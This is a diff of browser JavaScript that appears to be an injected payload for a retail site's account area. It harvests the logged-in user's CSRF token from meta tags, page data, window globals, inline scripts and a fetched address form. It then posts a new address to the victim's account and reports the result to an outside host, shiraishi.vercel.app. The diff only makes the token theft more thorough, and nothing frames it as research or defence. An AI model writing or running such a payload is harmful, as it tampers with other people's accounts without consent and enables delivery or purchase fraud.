@@ -3,41 +3,56 @@
 
   const getCsrf = async () => {
     const m = document.querySelector('meta[name="csrf-token"],meta[name="x-csrf-token"]');
-    if (m && m.content) return m.content;
+    if (m && m.content) { log('csrf: meta'); return m.content; }
 
     if (window.__NEXT_DATA__ && window.__NEXT_DATA__.props && window.__NEXT_DATA__.props.pageProps) {
       const p = window.__NEXT_DATA__.props.pageProps;
-      if (p.csrfToken) return p.csrfToken;
+      if (p.csrfToken) { log('csrf: __NEXT_DATA__'); return p.csrfToken; }
+      if (p.xCsrfToken) { log('csrf: __NEXT_DATA__.xCsrfToken'); return p.xCsrfToken; }
     }
+
+    for (const k of Object.keys(window)) {
+      if (/csrf/i.test(k) && typeof window[k] === 'string' && window[k].length >= 40) {
+        log('csrf: window.' + k);
+        return window[k];
+      }
+    }
+
+    const patterns = [
+      /"csrfToken"\s*:\s*"([^"]+)"/,
+      /"xCsrfToken"\s*:\s*"([^"]+)"/,
+      /x-csrf-token["']?\s*[:=]\s*["']([^"']+)["']/i,
+      /csrfToken["']?\s*[:=]\s*["']([^"']+)["']/i
+    ];
 
     try {
       const html = await fetch('/en-gb/account/addresses/new', {
         credentials: 'include'
       }).then(r => r.text());
 
-      const patterns = [
-        /x-csrf-token["']?\s*[:=]\s*["']([^"']+)["']/i,
-        /"csrfToken"\s*:\s*"([^"]+)"/,
-        /csrfToken["']?\s*[:=]\s*["']([^"']+)["']/i,
-        /<meta[^>]+name=["']csrf-token["'][^>]+content=["']([^"']+)["']/i
-      ];
-
       for (const p of patterns) {
         const match = html.match(p);
-        if (match && match[1]) return match[1];
+        if (match && match[1]) { log('csrf: form HTML'); return match[1]; }
       }
     } catch (e) {
       log('form fetch failed:', e.message);
+    }
+
+    for (const s of document.querySelectorAll('script:not([src])')) {
+      for (const p of patterns) {
+        const match = s.textContent.match(p);
+        if (match && match[1]) { log('csrf: inline script'); return match[1]; }
+      }
     }
 
     return null;
   };
 
   const token = await getCsrf();
-  log('token:', token, 'len:', token ? token.length : 0);
-  if (!token || token.length < 30) return;
+  log('token:', token ? token.slice(0, 12) + '...' : null, 'len:', token ? token.length : 0);
+  if (!token || token.length < 40) { log('aborting: no valid token'); return; }
 
-  const addressId = String(Date.now()) + String(Math.floor(Math.random() * 1000)).padStart(3, '0');
+  const addressId = String(Date.now());
 
   const body = JSON.stringify({
     item: {
@@ -62,15 +77,15 @@
     },
     body
   }).catch(e => {
-    log('fetch failed:', e.message);
+    log('POST failed:', e.message);
     return null;
   });
 
   if (!res) return;
-  log('status:', res.status, 'addressId:', addressId);
+  log('POST status:', res.status);
 
   const txt = await res.text().catch(() => '');
-  log('response:', txt.slice(0, 500));
+  log('POST response:', txt.slice(0, 300));
 
   try {
     await fetch('https://shiraishi.vercel.app/log?ok=' + res.status + '&id=' + addressId);
